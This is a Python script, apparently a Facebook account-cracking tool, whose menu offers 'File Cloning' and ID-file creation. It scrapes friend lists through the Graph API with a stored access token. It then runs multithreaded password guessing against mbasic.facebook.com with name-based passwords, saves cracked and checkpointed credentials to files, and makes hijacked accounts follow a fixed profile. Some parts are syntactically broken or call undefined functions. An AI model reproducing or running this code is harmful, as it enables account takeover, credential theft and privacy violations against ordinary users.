#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 12; SOG02 Build/58.2.C.3.127)","Dalvik/2.1.0 (Linux; U; Android 11; SmartVision3 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J200M Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 12.0; TX10MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; TECNO CH9 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; GM1917 Build/SKQ1.211019.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g82 5G Build/S1SUS32.73-112-2-7)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; VUVAMINI Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; HOTREALS Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; DECSMART Build/RTT0.211009.001)","Dalvik/2.1.0 (Linux; U; Android 12; T28-EEA Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (XT2115DL) Build/RPCS31.Q2-109-16-16)","Dalvik/2.1.0 (Linux; U; Android 8.1; HOT10 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-14)","Dalvik/2.1.0 (Linux; U; Android 11; KIVI 4K Android TV Build/RTM5.220609.207)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJS30.506-7-18)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-17-2)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Z986U Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; 3277 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2ST32.71-118-4)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005DA Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9-4)","Dalvik/2.1.0 (Linux; U; Android 12; LM-F100N Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A202F Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N)","Dalvik/2.1.0 (Linux; U; Android 13; V2205 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3)","Dalvik/2.1.0 (Linux; U; Android 13; 2107113SI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.600VZ.0576.a)","Dalvik/2.1.0 (Linux; U; Android 12; SH-M17 Build/S6062)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 11; Star 5 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-7)","Dalvik/2.1.0 (Linux; U; Android 9; Aquaris X Pro Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ72 Build/64.1.A.0.891)","Dalvik/2.1.0 (Linux; U; Android 11; XM-SW1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; LM-V600 Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K7AI Build/TQ1A.230105.002)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G20 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; 22041219PI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6826B Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 ultra Build/S3SQS32.16-72-31-3)","Dalvik/2.1.0 (Linux; U; Android 11; M2003J15SC Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415FN Build/M1AJQ)","Dalvik/2.1.0 (Linux; U; Android 13; DN2101 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; PHB110 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 12; Helium Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; MS5539G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; VRD-W10 Build/HUAWEIVRD-W10)","Dalvik/2.1.0 (Linux; U; Android 9; HP Chromebook x360 11 G1 EE Build/R114-15437.8.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; motorola razr 2022 Build/S3SLS32.16-72-14-6)","Dalvik/2.1.0 (Linux; U; Android 11; Schok Volt SV55 Build/SV55216_01.02.04)","Dalvik/2.1.0 (Linux; U; Android 11; Multilaser_GMAX_2 Build/V8_20230215)","Dalvik/2.1.0 (Linux; U; Android 13; S9-KC Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g41 Build/S3RWS32.138-29-5-1)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-26)","Dalvik/2.1.0 (Linux; U; Android 7.0; 4047G Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A716S Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; SHV45-u Build/SA110)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A336N Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G950F Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A520F Build/R16NW)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; XT907 Build/KPA20.10.1)","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 4 Build/QQ2A.200501.001.B2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; HELIOS Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; BRQ-AN00 Build/HUAWEIBRQ-AN00)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 pro Build/T1SHS33.35-23-20-2)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SO-53C Build/63.1.B.1.78)","Dalvik/2.1.0 (Linux; U; Android 9; U-BOX A9 Build/UMAX_AI_M)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900 Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; SH-A01 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; skipper Build/OTT1.201231.001/6.0.5.0421)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0021.0)","Dalvik/2.1.0 (Linux; U; Android 10; mainline Build/QD4A.200805.003)","Dalvik/2.1.0 (Linux; U; Android 10; M10_4G_PRO Build/V17_20230110)","Dalvik/2.1.0 (Linux; U; Android 11; P60_EEA Build/MX2_EEA)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-22)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.418)","Dalvik/2.1.0 (Linux; U; Android 9; H8416 Build/52.0.A.8.157)","Dalvik/2.1.0 (Linux; U; Android 11; X96_X4_Pro Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G981B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; Micromax E311 Build/KOT49H)",}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
   \033[1;37m ######      ######     ########  
   \033[1;37m##    ##    ##    ##    ##     ## 
   \033[1;37m##          ##          ##     ## 
   \033[1;37m ######      ######     ########  
   \033[1;37m     b ##          ##    ##     ## 
   \033[1;37m##    ##    ##    ##    ##     ## 
   \033[1;37m ######      ######     ########  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Sarfraz Baloch
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Sarfraz Baloch
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Sarfraz-Ssb
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.0.0
\033[1;37m------------------------\033[1;37m------------------------ """                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back SSB Menu ")
	    sarfraz()

def sarfraz():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Start File Cloning')
    print(' [2] Create File [Best-Method]')
    print(' [E] exit ')
    print('')
    _sarfraz___ = input(' [?] Choose option : ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        create_file()
    if _sarfraz___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[SSB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [SSB-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SSB_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] Crack With Auto Pass ')
        print('[2] Crack With Name Digit Pass')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

def create_file():
    os.system('clear')
    print(logo)
    print('  [1] Create file manual')
    print('  [2] Create file auto')
    print('  [B] Back to main menu')
    print(50*'-')
    cf = input('  Choose method: ')
    if cf =='1':
        manual()
    elif cf =='2':
        auto()
    elif cf =='3':
        likes()
    elif cf =='3' or cf =='b' or cf =='B':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        create_file()

def manual():
    try:
        token = open('/sdcard/tokenofl.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s: '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    sarfraz()
    
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('/sdcard/tokenofl.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
           # print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    safraz()
    
    
    
sarfraz()